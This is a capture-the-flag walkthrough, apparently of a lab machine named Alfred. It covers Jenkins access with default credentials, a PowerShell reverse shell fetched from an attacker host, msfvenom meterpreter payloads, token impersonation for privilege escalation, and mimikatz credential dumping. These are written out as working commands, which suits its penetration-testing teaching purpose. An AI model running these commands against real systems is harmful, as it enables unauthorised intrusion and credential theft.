Exploited Jenkins gained an initial shell, then escalated privileges by exploiting Windows authentication tokens. Deployment of meterpreter with web_delivery. 

----------

Legal Usage: The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “ethical hacker” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.
By continued reading, you acknowledge the aforementioned user risks/responsibilities.

----------

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585775160807_image.png)



# Recon
Target: 10.10.230.14

**Nmap scan:**

    nmap -sV -sC -oA nmap/alfred 10.10.230.14 -Pn

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585766466669_image.png)


**Nmap all ports:**

    nmap -p- nmap/alfred_allports 10.10.230.14 -Pn

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585767313953_image.png)


Open Port Review:

Port 80 - Microsft IIS httpd 7.5 - webserver

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585766694659_image.png)


image bruce.jpg and email exposed `alfred@wayneeterprises.com`.

Port 3389 - Remote RDP

Port 8080 - Jetty 9.4.z-SNAPSHOT - webserver

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585766826381_image.png)


login attempt with `admin:admin` enable access to backend.

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585766903480_image.png)


version number exposed as `Jenkins ver. 2.190.1`

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585767468918_image.png)


Jenkins searchsploit:

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585767530004_image.png)


## accessing console

discovered console:

    http://10.10.230.14:8080/job/project/1/console

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585767075782_image.png)


Under “Build” section of the `/job/project/configure` the “whoami” offers an ability execute commands on the target system.


# Reverse Shell

using nishang `PowerShellTcp.ps1` to create a reverse shell:

Github Link: https://github.com/samratashok/nishang.git

creating webserver on local machine via python3

    python3 -m http.server

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585768324089_image.png)


adding powershell command to console “Build” section:

    powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.20.45:8000/PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.20.45 -Port 9000

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585768533565_image.png)


Listener setup:
rlwrap allows for (up, down, left, right keyboard commands)

    rlwrap nc -lvnp 9000

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585768713613_image.png)

**Connection received:**

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585768868433_image.png)


**Systeminfo**

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585771800880_image.png)


**User.txt** 
located: `C:\Users\bruce\desktop\user.txt`

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585776055961_image.png)


# Upgrading shell to meterpreter shell

create payload with msfvenom

    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai EXITFUNC=thread LHOST=10.8.20.45 LPORT=9001 -f exe -o revshell9001exit.exe

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585769169449_image.png)

**Setup multi/handler**

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585769423692_image.png)

**Download revshell to target**

    powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.20.45:8000/revshell9001.exe','revshell9001.exe')"

Start process with:

    Start-Process "revshell9001.exe"

(in my case meterpreter would hang and never fully connect to handler. Moved to creating meterpreter session with web_delivery)

**Creating Meterpreter shell via web_delivery**

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585774103165_image.png)


took the generated code and executed on target:

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585774177738_image.png)

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585774143422_image.png)


**Migrate to higher process**

    ps
    migrate

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585774491520_image.png)


elevated:

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585774529650_image.png)


# Windows User Impersonation

investigate privleages of bruce:

    whoami /priv

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585771129738_image.png)


from this we are able exploit as they are enabled:

    SeDebugPrivilege
    SeImpersonatePrivilege 

**Load Incognito + List tokens within meterpreter**

    load incognito
    list_tokens -g

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585774715943_image.png)


 **Impersonate token**

    impersonate_token "BUILTIN\Administrators"

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585773873560_image.png)


## root.txt

located at `C:\Windows\System32\config`

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585775871288_image.png)


# Post Exploitation
## mimikatz extract
    load kiwi
    get_creds

![](https://paper-attachments.dropbox.com/s_61BA8F69E29EA135ED40C9EA88A2EC4EA2D184DC38B2C055BCF95CCA7FDAF01A_1585775978547_image.png)


